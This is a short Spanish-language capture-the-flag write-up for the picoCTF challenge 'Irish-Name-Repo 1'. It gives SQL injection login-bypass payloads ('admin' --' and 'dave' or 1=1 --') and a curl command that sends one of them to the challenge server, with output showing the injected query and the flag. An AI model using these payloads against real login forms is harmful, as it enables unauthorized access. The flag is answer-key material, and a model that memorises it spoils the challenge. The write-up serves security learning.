## Irish-Name-Repo 1

### Descripción
Do you think you can log us in? Try to see if you can login!
### Solución

#### Solución 1
Inyección sql con admin' -- ó dave' or 1=1 --
picoCTF{s0m3_SQL_85832275}

#### Solución 2
```
┌──(dave㉿kaliv1rus)-[~]
└─$ curl -s http://fickle-tempest.picoctf.net:56049/login.php -d "username=dave' or 1=1 -- &password=aaa&debug=1"
<pre>username: dave' or 1=1 -- 
password: aaa
SQL query: SELECT * FROM users WHERE name='dave' or 1=1 -- ' AND password='aaa'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_85832275}</p>
```

### Notas adicionales


### Referencias

-